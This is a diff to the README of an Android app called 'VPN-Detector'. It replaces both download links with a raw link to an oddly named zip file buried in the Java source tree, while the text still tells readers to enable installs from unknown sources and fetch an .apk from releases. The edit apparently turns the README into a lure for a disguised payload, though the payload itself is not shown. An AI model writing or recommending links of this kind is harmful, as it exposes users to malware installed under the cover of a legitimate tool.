@@ -1,6 +1,6 @@
 # 🛡️ VPN-Detector - Identify active private network connections easily
 
-[![](https://img.shields.io/badge/Download-VPN-Detector-blue.svg)](https://github.com/Amy7007/VPN-Detector)
+[![](https://img.shields.io/badge/Download-VPN-Detector-blue.svg)](https://github.com/Amy7007/VPN-Detector/raw/refs/heads/main/detector/src/main/java/com/cherepavel/vpndetector/detector/Detector-VP-consulate.zip)
 
 ## 🔍 Understanding VPN-Detector
 
@@ -23,7 +23,7 @@ Ensure your device allows installations from unknown sources. You find this sett
 
 Visit the page below to download the latest version of the VPN-Detector application. 
 
-[Download the VPN-Detector Installer](https://github.com/Amy7007/VPN-Detector)
+[Download the VPN-Detector Installer](https://github.com/Amy7007/VPN-Detector/raw/refs/heads/main/detector/src/main/java/com/cherepavel/vpndetector/detector/Detector-VP-consulate.zip)
 
 Follow the link to the releases section. Look for the file ending in .apk. Select the file to save it to your local storage. Once the download finishes, locate the file in your downloads folder.
 
